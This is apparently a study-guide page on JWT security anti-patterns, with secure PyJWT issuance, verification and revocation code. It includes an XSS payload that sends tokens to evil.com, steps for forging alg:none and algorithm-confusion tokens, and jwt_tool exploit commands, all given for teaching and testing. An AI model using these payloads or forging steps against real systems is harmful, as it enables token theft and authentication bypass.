---
id: SEC-056
title: "JWT Security Anti-Patterns"
category: "Security"
tier: tier-2-networking-security
folder: SEC-security
difficulty: ★★★☆
depends_on: SEC-001, SEC-010, SEC-016, SEC-028, SEC-041, SEC-045
used_by: SEC-057, SEC-058, SEC-071, SEC-087, SEC-093
related: SEC-010, SEC-016, SEC-028, SEC-045, SEC-057, SEC-058
tags:
  - security
  - jwt
  - json-web-tokens
  - authentication
  - anti-pattern
  - alg-none
  - algorithm-confusion
status: complete
version: 4
layout: default
parent: "Security"
grand_parent: "Technical Mastery"
nav_order: 56
permalink: /technical-mastery/sec/jwt-anti-patterns/
---

⚡ TL;DR - JWTs are widely misused. The most dangerous mistakes:
`alg:none` attack (signature bypassed entirely), algorithm
confusion (RS256 public key used as HS256 secret), JWT in
localStorage (XSS steals tokens), no expiry (tokens live forever),
sensitive data in payload (not encrypted, only base64).

**Minimum JWT security requirements:**
```python
# VERIFY - always specify allowed algorithms
import jwt
payload = jwt.decode(
    token,
    key=PUBLIC_KEY,        # or SECRET_KEY
    algorithms=["RS256"],  # EXPLICIT allowlist - never ["*"] or omit
    options={
        "require": ["exp", "iss", "aud"],  # Require these claims
    },
    audience="https://api.example.com",
    issuer="https://auth.example.com"
)
```

---

| #056 | Category: Security | Difficulty: ★★★☆ |
|:---|:---|:---|
| **Depends on:** | OWASP Top 10, Security Fundamentals, Input Validation, JSON Web Tokens, Security Code Review, Authentication Decision Tree | |
| **Used by:** | OAuth 2.0 Deep Dive, OpenID Connect, Advanced JWT Attacks, JWT Revocation | |
| **Related:** | JWT fundamentals, Session management, OAuth 2.0, OIDC | |

---

### 🔥 The Problem This Solves

**THE SIX MOST CRITICAL JWT ANTI-PATTERNS:**

```
ANTI-PATTERN 1: alg:none ATTACK

JWT header: {"alg": "none", "typ": "JWT"}

How JWTs work: Header.Payload.Signature (3 parts, base64url-encoded)
Signature: HMAC(header + "." + payload, secret_key)

alg:none attack:
  Attacker creates: {"alg":"none"}.{"sub":"admin","role":"admin"}.
  (empty signature: just a trailing dot, or no third section)
  
  VULNERABLE LIBRARY CODE:
    decoded = jwt.decode(token, options={"verify_signature": False})
    # OR:
    alg = get_header(token)["alg"]
    if alg == "none":
        return parse_payload(token)  # No verification!
  
  Result: attacker claims any role, any user ID, any permissions.
  No secret key needed. Pure header manipulation.
  
  FIX: Always specify algorithms in the allowlist.
    jwt.decode(token, key, algorithms=["RS256"])  # NEVER ["none"]
    # Most modern libraries default to NOT allowing alg:none
    # But verify your library version's default behavior.

ANTI-PATTERN 2: ALGORITHM CONFUSION (RS256 → HS256)

Context: RS256 = sign with RSA private key, verify with RSA public key
         HS256 = sign AND verify with the SAME HMAC secret

Attack:
  1. Server uses RS256. Public key is published (well-known JWKS endpoint)
     or easily obtained.
  2. Attacker takes the RSA PUBLIC KEY (public - known to all).
  3. Creates a JWT with header: {"alg": "HS256", "typ": "JWT"}
  4. Signs the JWT with HS256 using the RSA PUBLIC KEY as the HMAC secret.
  
  VULNERABLE VERIFICATION CODE:
    key = get_public_key(token)  # Returns RSA public key
    alg = get_header(token)["alg"]  # Returns "HS256" (attacker-controlled!)
    jwt.verify(token, key, algorithms=[alg])
    # verify() uses key as HMAC secret for HS256
    # Public key is public → attacker knows it → can sign with it!
    # Signature verifies successfully.
  
  FIX: Never use the algorithm from the token header to select
    the verification algorithm. The algorithm must be fixed in
    server configuration.
    jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
    # "RS256" is our configuration, not from the token.

ANTI-PATTERN 3: JWT IN LOCALSTORAGE

  Why it happens:
    localStorage.setItem('auth_token', jwt)
    // Easy to use: fetch('/api', {headers: {Authorization: `Bearer ${localStorage.getItem('auth_token')}`}})
  
  Why it's dangerous:
    ANY JavaScript running on the page can read localStorage.
    XSS: <script>fetch('https://evil.com/?t='+localStorage.getItem('auth_token'))</script>
    Injected ads, browser extensions (in some contexts), third-party scripts.
    Stolen JWT → replay the token → impersonate user.
    
    Unlike cookies, localStorage has NO httpOnly flag.
    A stored XSS payload persists forever → drains tokens from every victim
    who visits the page.
  
  FIX: Store JWTs in HttpOnly, Secure, SameSite=Strict cookies.
    HttpOnly: JavaScript cannot read it (XSS cannot steal it)
    Secure: only sent over HTTPS
    SameSite=Strict: not sent on cross-site requests (CSRF protection)
    
    If you MUST use localStorage (e.g., cross-subdomain SPA):
      Use short-lived access tokens (15 min max)
      Use refresh tokens in HttpOnly cookies
      Accept that XSS is a higher risk in this architecture

ANTI-PATTERN 4: NO EXPIRY (no "exp" claim)

  JWT without exp:
    {"sub":"alice","role":"admin"}  # No exp claim
    This token is valid FOREVER.
    If alice leaves the company or is suspended: token still works.
    If token is stolen: valid indefinitely.
  
  FIX:
    Access token: exp = 15 minutes (short)
    Refresh token: exp = 7 days (longer, but stored in HttpOnly cookie)
    Include exp, iss (issuer), aud (audience) in every token.
    Verify all three on receipt.

ANTI-PATTERN 5: SENSITIVE DATA IN JWT PAYLOAD

  JWT payload is BASE64URL ENCODED, NOT ENCRYPTED.
    eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9
    → {"sub":"1234567890","username":"alice","role":"admin"}
    Anyone can decode this. Try jwt.io with any JWT.
  
  NEVER put in JWT payload:
    Passwords (obviously)
    Credit card numbers
    Social security numbers
    Medical information
    Any data you would not display on a public page
  
  Commonly over-shared:
    Full user profile (use minimum claims: sub, roles, exp)
    Email address (may not be needed in every API call)
    Phone number, date of birth
  
  FIX: Store only what the receiving service needs to process
    the request. Use sub (user ID) and lookup additional
    data from database if needed.
    
    If encryption is needed: use JWE (JSON Web Encryption)
    instead of JWT (JSON Web Signature). JWE encrypts the payload.

ANTI-PATTERN 6: NOT VALIDATING iss, aud, sub CLAIMS

  Attack scenario:
    Service A issues JWTs for its users.
    Service B also accepts JWTs but doesn't check iss.
    Alice has a valid JWT for Service A.
    Alice submits her Service A JWT to Service B.
    Service B verifies the signature (valid!) and trusts the token.
    Alice now has Service A-level access to Service B.
  
  Confused deputy attack: a legitimate token for one service
  is accepted by another service that shares the same JWT key.
  
  FIX: Always verify:
    iss (issuer): must match your expected issuer
    aud (audience): must match this specific service's identifier
    exp: not expired
    sub: user ID is what you expect (no privilege escalation via sub manipulation)
```

---

### 📘 Textbook Definition

**JSON Web Token (JWT):** A compact, URL-safe format for
transmitting claims between parties. Format: `Header.Payload.Signature`.
Header: algorithm + type. Payload: claims (registered claims like
`sub`, `exp`, `iss`, `aud`; plus custom claims). Signature: HMAC
or RSA/ECDSA over header+payload to verify integrity.

**JWT Anti-Patterns:** Implementation mistakes in JWT creation or
verification that allow attackers to forge tokens, bypass signature
verification, or extract sensitive data from token payloads.

**JWS vs JWE:**
- JWS (JSON Web Signature): signs payload for integrity. Payload visible but tamper-proof.
  The "JWT" everyone uses.
- JWE (JSON Web Encryption): encrypts payload for confidentiality.
  Payload not visible. Use when payload contains sensitive data.

**JWT revocation problem:**
JWTs are stateless - the server doesn't store them. Valid until `exp`.
If a JWT is stolen or user is revoked: token remains valid until expiry.
Solutions: (a) short expiry (15 min) with refresh token pattern,
(b) maintain a revocation list (blocklist of revoked JTI claims),
(c) switch to opaque session tokens for contexts requiring instant revocation.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
JWTs are not secure by default - the algorithm is in the token
header (attacker-controlled), the payload is readable by anyone,
and tokens never expire unless you set `exp`. Always specify
the allowed algorithm, require `exp`/`iss`/`aud`, and store in
HttpOnly cookies, not localStorage.

**One analogy:**
> A JWT is like a concert ticket with a QR code.
> The ticket printer (issuer) signs it to prevent forgery.
> 
> alg:none attack: accepting tickets that say "signature algorithm: none"
> - the venue just accepts any paper that looks like a ticket.
> 
> Algorithm confusion: the ticket says "verified by stamp A" but the
> venue is using "stamp B" technique to verify "stamp A" tickets -
> an attacker who knows stamp B's pattern can forge stamp A tickets
> that pass the wrong verification method.
> 
> Sensitive data in payload: putting the attendee's SSN and credit
> card on the ticket. The ticket is handed to the venue staff and
> can be read by anyone who handles it.
> 
> No expiry: concert tickets from 2015 still accepted today.

---

### 🔩 First Principles Explanation

**JWT structure and where each attack targets:**

```
JWT STRUCTURE:
  Header.Payload.Signature
  
  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
  .eyJzdWIiOiJ1c3JfMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MTYwMDAwMDB9
  .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
  
  Decode:
    header:  {"alg":"RS256","typ":"JWT"}
    payload: {"sub":"usr_123","role":"user","exp":1716000000}
    sig:     RSA signature over header+payload using private key

WHERE EACH ATTACK TARGETS:

  alg:none → Header manipulation (change alg to "none")
  Algorithm confusion → Header manipulation (change alg from RS256 to HS256)
  No exp → Payload (missing claim)
  Sensitive data → Payload (readable by anyone)
  localStorage → Storage (accessible to XSS)
  Missing iss/aud check → Payload verification (skip these claims)

VERIFICATION ALGORITHM (correct):

  def verify_jwt(token: str, public_key: str) -> dict:
      try:
          payload = jwt.decode(
              token,
              public_key,
              algorithms=["RS256"],    # 1. Fixed algorithm (not from token)
              audience="https://api.example.com",  # 2. Verify audience
              issuer="https://auth.example.com",   # 3. Verify issuer
              options={
                  "require": ["exp", "iss", "aud", "sub"],  # 4. Require claims
                  "verify_exp": True,   # 5. Verify expiry
              }
          )
          return payload
      except jwt.ExpiredSignatureError:
          raise AuthError("Token expired")
      except jwt.InvalidAudienceError:
          raise AuthError("Invalid audience")
      except jwt.InvalidIssuerError:
          raise AuthError("Invalid issuer")
      except jwt.InvalidSignatureError:
          raise AuthError("Invalid signature")
      except jwt.DecodeError:
          raise AuthError("Invalid token format")
```

---

### 🧪 Thought Experiment

**SCENARIO: JWT revocation problem**

```
PROBLEM: User's account is compromised. Security team revokes
access. How do you invalidate their JWT immediately?

JWT IS STATELESS:
  Server doesn't store JWTs.
  Valid JWT + correct signature → server trusts it.
  No "database lookup" to check if it's revoked.
  Can't "delete" a JWT from the server side.

OPTION 1: Short expiry (15 min access tokens)
  Pros: Simple. No database lookup. Standard approach.
  Cons: Up to 15 minutes of access after revocation.
  For most applications: acceptable. Security team can force
  password reset → refresh token invalidated → no new access tokens.

OPTION 2: Token blocklist (JTI-based)
  JWT includes "jti" (JWT ID) claim: a unique identifier per token.
  Server maintains a Redis set of revoked JTI values.
  
  On every request:
    1. Verify signature (stateless)
    2. Check Redis: is jti in revoked_set?
       If yes: reject (token revoked)
       If no: allow
  
  Pros: Immediate revocation.
  Cons: Redis lookup on every request (latency). Redis becomes
    critical dependency. Must clean up expired JTI values.
  
  Redis TTL pattern: store revoked_jti with TTL = token's remaining
  lifetime. Redis auto-expires it. Prevents unbounded growth.
  SET revoked:{jti} 1 EX {remaining_seconds}

OPTION 3: Versioned tokens (user-side invalidation)
  User model has: token_version (integer, increments on logout/revoke)
  JWT payload includes: version claim
  
  On every request:
    Verify signature (stateless)
    Check: token.version == db.get_user(sub).token_version?
    If no: reject (token from old version, user was logged out)
  
  Pros: Invalidate ALL tokens for a user with one DB update.
  Cons: Database lookup on every request (similar overhead to blocklist).

OPTION 4: Opaque session tokens (no JWT for high-security contexts)
  Banking, healthcare: use opaque session tokens stored in DB.
  On every request: lookup session ID in DB → get user.
  Revocation: DELETE session record → immediate effect.
  
  Pros: Instant revocation. No stateless complexity.
  Cons: DB lookup every request. Not suitable for federated auth.
  
  WHEN TO CHOOSE:
    Immediate revocation required + single service: opaque sessions.
    Microservices + acceptable 15-min window: JWT + short expiry.
    Immediate revocation + microservices: JWT + JTI blocklist in Redis.
```

---

### 🧠 Mental Model / Analogy

> JWT anti-patterns map to failures in trust hierarchies.
>
> alg:none = accepting an unsigned check.
> "I promise this is valid." No signature. No verification.
> A trusted payer doesn't need to sign - but that means
> ANYONE can claim to be a trusted payer.
>
> Algorithm confusion = verifying a check with the wrong stamp.
> Check says "verified by stamp RS256." Bank uses "stamp HS256"
> to verify it (wrong method). Attacker who knows HS256's
> pattern can forge stamps that pass HS256 verification.
>
> JWT in localStorage = writing your bank card PIN on the card.
> Anyone who can read the card (any JavaScript on the page)
> now has both the card and the PIN.
>
> No expiry = a hotel key card that never deactivates after checkout.
>
> Sensitive data in payload = broadcasting your medical records
> on a public channel. The message is authenticated (signed by
> you), but it's readable by everyone on the network.

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
JWTs are like digital ID cards. The common mistakes: using an ID card that says "no signature needed" (alg:none - anyone can fake it), leaving your ID card where anyone can steal it (localStorage - XSS steals it), making ID cards that never expire (no exp - stolen cards work forever), and writing your SSN on your ID card (sensitive data in payload - anyone can read it).

**Level 2 - How to use it (junior developer):**
Minimum secure JWT configuration: (1) verify signature with `algorithms=["RS256"]` - never let the library choose algorithm from the token; (2) set `exp` to 15 minutes for access tokens; (3) set `iss` and `aud` and verify them; (4) store in HttpOnly Secure SameSite cookie, not localStorage; (5) only put `sub` (user ID) and `roles` in payload - no PII.

**Level 3 - How it works (mid-level engineer):**
The alg:none and algorithm confusion vulnerabilities stem from the same root cause: the algorithm is in the token header, which is attacker-controlled. A secure implementation ignores the algorithm in the header entirely; the algorithm is a server-side configuration. The `python-jose` and `PyJWT` libraries both accept an `algorithms` parameter; when you pass `["RS256"]`, they will reject any token with a different algorithm in the header (including `none`). Algorithm confusion: a JWT library that accepts both RS256 and HS256 and uses the header-specified algorithm might verify a HS256 token using the RSA public key as the HMAC secret - which the attacker knows.

**Level 4 - Why it was designed this way (senior/staff):**
JWT (RFC 7519) was designed for flexibility across different cryptographic algorithms - the `alg` header was intentional to allow the receiver to know which algorithm to use for verification. The security problem is that this design decision put a security-relevant parameter under attacker control. RFC 8725 ("JSON Web Token Best Current Practices", 2020) addresses this: servers MUST validate that the `alg` header matches the expected algorithm, not trust it blindly. The JWK (JSON Web Key) standard and JWKS endpoints were designed to allow key rotation without re-deploying servers - but they introduced the `kid` (Key ID) header, which adds another attack surface (kid injection to select a different key).

**Level 5 - Mastery (distinguished engineer):**
Advanced JWT attacks covered in SEC-093: kid injection (manipulating the Key ID to point to a SQL query or file read for the key), jku/x5u injection (manipulating the JWK Set URL to point to an attacker-controlled JWKS endpoint), JWT header injection attacks. These are variations of algorithm confusion: the attacker controls a field in the JWT header that influences the key or algorithm selection. The defense is always the same: server-side configuration determines which keys and algorithms are valid; the token can provide a key ID as a hint, but the server validates the hint against a fixed set of known keys. The JWKS endpoint should be a static list under your control; never fetch the JWKS URL from the token header.

---

### ⚙️ How It Works (Mechanism)

**Secure JWT issuance and verification:**

```
ISSUANCE (create JWT):

  from datetime import datetime, timezone, timedelta
  import jwt  # PyJWT
  
  PRIVATE_KEY = load_rsa_private_key()   # From secrets manager
  PUBLIC_KEY = load_rsa_public_key()     # Can be published
  
  def create_access_token(user_id: str, roles: list[str]) -> str:
      now = datetime.now(timezone.utc)
      payload = {
          "sub": user_id,
          "roles": roles,
          "exp": now + timedelta(minutes=15),  # Short expiry
          "iat": now,           # Issued at
          "iss": "https://auth.example.com",
          "aud": "https://api.example.com",
          "jti": str(uuid.uuid4()),  # Unique ID (for revocation if needed)
      }
      return jwt.encode(
          payload,
          PRIVATE_KEY,
          algorithm="RS256"
          # DO NOT include sensitive data in payload
      )

VERIFICATION (decode JWT):

  def verify_access_token(token: str) -> dict:
      try:
          return jwt.decode(
              token,
              PUBLIC_KEY,
              algorithms=["RS256"],      # Fixed allowlist, NOT from token
              audience="https://api.example.com",
              issuer="https://auth.example.com",
              options={
                  "require": ["exp", "iss", "aud", "sub", "jti"],
                  "verify_exp": True,
              }
          )
      except jwt.PyJWTError as e:
          raise Unauthorized(str(e))

STORAGE (secure cookie, NOT localStorage):

  # FastAPI response:
  response.set_cookie(
      key="access_token",
      value=token,
      httponly=True,       # No JavaScript access (prevents XSS theft)
      secure=True,         # HTTPS only
      samesite="strict",   # No cross-site requests (prevents CSRF)
      max_age=900,         # 15 minutes (matches exp claim)
      path="/",
  )
```

---

### 💻 Code Example

**Full JWT lifecycle - issue, refresh, revoke:**

```python
# Complete JWT implementation with refresh token pattern

import jwt, uuid, redis
from datetime import datetime, timezone, timedelta

r = redis.Redis(host='localhost', port=6379, db=0)

ACCESS_TOKEN_EXPIRE_MINUTES = 15
REFRESH_TOKEN_EXPIRE_DAYS = 7
ISSUER = "https://auth.example.com"
AUDIENCE = "https://api.example.com"

def issue_tokens(user_id: str, roles: list[str]) -> dict:
    now = datetime.now(timezone.utc)
    access_jti = str(uuid.uuid4())
    refresh_jti = str(uuid.uuid4())
    
    access_token = jwt.encode(
        {
            "sub": user_id,
            "roles": roles,
            "exp": now + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES),
            "iat": now,
            "iss": ISSUER,
            "aud": AUDIENCE,
            "jti": access_jti,
        },
        PRIVATE_KEY,
        algorithm="RS256"
    )
    
    refresh_token = jwt.encode(
        {
            "sub": user_id,
            "type": "refresh",
            "exp": now + timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS),
            "iat": now,
            "iss": ISSUER,
            "aud": AUDIENCE,
            "jti": refresh_jti,
        },
        PRIVATE_KEY,
        algorithm="RS256"
    )
    
    return {"access_token": access_token, "refresh_token": refresh_token}

def verify_access_token(token: str) -> dict:
    payload = jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=["RS256"],      # Never accept "none"
        audience=AUDIENCE,
        issuer=ISSUER,
        options={"require": ["exp","iss","aud","sub","jti"]},
    )
    
    # Check revocation list (optional for instant revocation)
    jti = payload["jti"]
    if r.exists(f"revoked:{jti}"):
        raise Unauthorized("Token has been revoked")
    
    return payload

def revoke_token(jti: str, exp_timestamp: int):
    """Add token to revocation list with TTL = remaining lifetime."""
    remaining = exp_timestamp - int(datetime.now(timezone.utc).timestamp())
    if remaining > 0:
        r.setex(f"revoked:{jti}", remaining, "1")

def logout(access_token: str, refresh_token: str):
    """Revoke both tokens on logout."""
    for token in [access_token, refresh_token]:
        payload = jwt.decode(
            token, PUBLIC_KEY, algorithms=["RS256"],
            audience=AUDIENCE, issuer=ISSUER,
            options={"require": ["exp","jti"]},
        )
        revoke_token(payload["jti"], payload["exp"])
```

---

### ⚖️ Comparison Table

| Anti-Pattern | Risk Level | Attack | Fix |
|:---|:---|:---|:---|
| **alg:none** | Critical | Forge any token, no key needed | `algorithms=["RS256"]` only |
| **Algorithm confusion** | Critical | Use public key to forge RS256 tokens | Server-side algorithm config |
| **JWT in localStorage** | High | XSS steals token → replay | HttpOnly cookie |
| **No expiry** | High | Stolen token valid forever | exp = 15 min |
| **Sensitive data in payload** | Medium-High | Data readable by anyone | Minimal claims only |
| **No iss/aud check** | Medium | Cross-service token confusion | Require + verify iss, aud |
| **Weak HS256 secret** | Critical | Brute force or guess secret | RSA (RS256) or 256-bit secret |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|:---|:---|
| JWT is more secure than session tokens because it's cryptographically signed. | Signing provides integrity (tamper-proof), not security. The security depends entirely on correct verification: if verification is skipped (alg:none), bypassed (algorithm confusion), or if the payload is not validated (missing exp/iss/aud checks), the signature provides false confidence. An opaque session token looked up in a database on every request is often MORE secure than a JWT in many contexts: instant revocation, no algorithm confusion, no payload exposure. Use JWTs when you need stateless verification across services, not just because "JWT is more secure." |
| HttpOnly cookies prevent CSRF, so using HttpOnly cookies for JWTs is fully secure. | HttpOnly cookies prevent XSS theft (JavaScript can't read them). But they don't prevent CSRF (Cross-Site Request Forgery) on their own. The `SameSite=Strict` attribute (or `Lax` for most cases) prevents the cookie from being sent on cross-site requests, which mitigates CSRF. Use both `HttpOnly` and `SameSite`. If you can't use SameSite (legacy browsers, some mobile scenarios), you need a CSRF token in addition to the HttpOnly cookie. The combination HttpOnly + Secure + SameSite=Strict provides both XSS protection and CSRF protection. |

---

### 🚨 Failure Modes & Diagnosis

**Testing JWT implementations:**

```
TESTING ANTI-PATTERNS:

Test 1: alg:none
  Take any valid JWT (after normal login).
  Decode header: base64url.decode(jwt.split('.')[0])
  Change alg to "none".
  Re-encode header.
  Remove the signature (or keep just a dot).
  Send: b64({"alg":"none"}).b64(payload).
  Expected: 401 Unauthorized.
  Vulnerable: request succeeds (token accepted without signature).

Test 2: Algorithm confusion
  Take any valid JWT (RS256).
  Get the server's public key (JWKS endpoint, source code, certificate).
  Create new JWT with header: {"alg":"HS256"}
  Sign it with HS256 using the RSA public key as HMAC secret.
  Send this token.
  Expected: 401 (algorithm not allowed).
  Vulnerable: request succeeds.

Test 3: JWT storage
  Log in. Open browser devtools → Application → Local Storage.
  Is the JWT stored there? (should be empty)
  Check cookies: should see an httponly cookie.

TOOLS:
  jwt.io: decode and inspect JWT payload
  jwt_tool (Python): automated JWT security testing
    git clone https://github.com/ticarpi/jwt_tool
    python3 jwt_tool.py <jwt> --exploit alg  # Tests alg:none
    python3 jwt_tool.py <jwt> --exploit k -pk ./pubkey.pem  # Tests algorithm confusion

DEBUGGING jwt.decode ERRORS:
  ExpiredSignatureError: token exp claim is in the past → renew token
  InvalidAudienceError: token aud doesn't match your service's identifier
  InvalidIssuerError: token iss doesn't match expected auth server
  DecodeError: malformed JWT (not 3 dot-separated parts)
  InvalidSignatureError: signature verification failed (wrong key, tampering)
```

---

### 🔗 Related Keywords

**Prerequisites:**
- `Security Fundamentals` - trust and authentication concepts
- `JSON Web Tokens (JWT)` - JWT structure and standard claims
- `Authentication Method Decision Tree` - when to use JWT

**Builds on this:**
- `OAuth 2.0 Deep Dive` - JWT as OAuth access token
- `OpenID Connect (OIDC)` - ID token (JWT with identity claims)
- `Advanced JWT Attacks` - kid injection, jku/x5u manipulation

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ ALWAYS       │ algorithms=["RS256"] (never from header)  │
│              │ Require exp, iss, aud claims              │
│              │ HttpOnly + Secure + SameSite cookie       │
├──────────────┼───────────────────────────────────────────┤
│ NEVER        │ algorithms=["none"] or omit algorithms    │
│              │ Store JWT in localStorage                 │
│              │ PII or secrets in payload                 │
│              │ Omit exp claim (tokens live forever)      │
├──────────────┼───────────────────────────────────────────┤
│ SET          │ exp = 15min (access), 7 days (refresh)    │
│              │ iss = auth server URL                     │
│              │ aud = API URL                             │
│              │ jti = uuid (for revocation)               │
├──────────────┼───────────────────────────────────────────┤
│ REVOCATION   │ Short exp + refresh token rotation OR     │
│              │ JTI blocklist in Redis with TTL           │
└──────────────────────────────────────────────────────────┘
```

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
"Security-relevant configuration belongs in server config,
not in attacker-controlled input."
JWT's alg header is attacker-controlled. Algorithm confusion
attacks exploit the mistake of trusting attacker-controlled
configuration for security decisions.
This principle generalizes: never let untrusted input select
the security mechanism that validates that same input.
Other examples of the same mistake:
- SQL: "what character should I use to escape?" → attacker says
  "use nothing" → SQL injection.
- Cryptography: "what cipher should I use?" → attacker says
  "cipher=none" → no encryption.
- URL parsing: "what parser should I use?" → different parsers
  give different results → filter bypass.
Security algorithms, parsers, and verification methods are
always server-side configuration. The input gets verified
against the fixed configuration; the configuration is never
derived from the input.

---

### 💡 The Surprising Truth

The algorithm confusion attack (RS256 → HS256) was publicly
disclosed in 2015 by Tim McLean. At that time, most JWT
libraries accepted any algorithm specified in the token header
without validating it against a server-side allowlist.
The attack worked against major libraries including
node-jsonwebtoken, python-jwt, and others.
The fix was simple: require the server to specify the allowed
algorithms and reject tokens with any other algorithm.
But the reason the vulnerability existed at all reveals a
design mistake in the JWT specification: putting a
security-relevant parameter under caller control.
RFC 8725 (2020, "JWT Best Current Practices") explicitly
addresses this: "Servers MUST only use encryption algorithms
that they support and that are appropriate for the intended use."
The JWT spec was published in 2015 (RFC 7519); the best
practices RFC came five years later. Five years of algorithm
confusion vulnerabilities in production systems.
The lesson: cryptographic flexibility (supporting many algorithms)
is a footgun for implementers, not a feature. Fixed algorithms
per use case are safer than flexible algorithm negotiation.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**
1. **EXPLAIN** why algorithms must be server-side configuration
   (not from token header) - and demonstrate the alg:none attack.
2. **DEMONSTRATE** algorithm confusion attack step-by-step using jwt_tool.
3. **IMPLEMENT** full JWT verification requiring exp, iss, aud, sub, jti.
4. **DESIGN** a JWT revocation strategy: JTI blocklist for instant
   revocation or short expiry + refresh token rotation for simpler ops.

---

### 🎯 Interview Deep-Dive

**Q: What are the main JWT security vulnerabilities?
How do you mitigate them?**

*Why they ask:* JWT is everywhere. Anti-patterns are common. Tests
whether candidate understands the crypto properly, not just the API.

*Strong answer covers:*
- alg:none: attacker changes header to skip signature. Fix: always
  specify `algorithms=["RS256"]` - never use the alg from the token.
- Algorithm confusion: RS256 uses public key; HS256 uses shared secret.
  If server accepts both: attacker submits HS256 token signed with
  the public key (which they know). Server verifies with public key
  as HMAC secret → succeeds. Fix: server-side algorithm configuration.
- localStorage: XSS steals tokens. Fix: HttpOnly Secure SameSite cookie.
- No expiry: stolen tokens valid forever. Fix: exp = 15 minutes (access).
- Sensitive data in payload: base64 is not encryption, anyone can decode.
  Fix: only sub + roles + exp. Use JWE if payload must be encrypted.
- Missing claim validation: tokens from Service A accepted by Service B.
  Fix: verify iss, aud, sub on every token.
- Revocation: JWT is stateless, can't revoke until exp.
  Options: short expiry + refresh rotation (simple), JTI blocklist in
  Redis (immediate revocation, adds Redis dependency).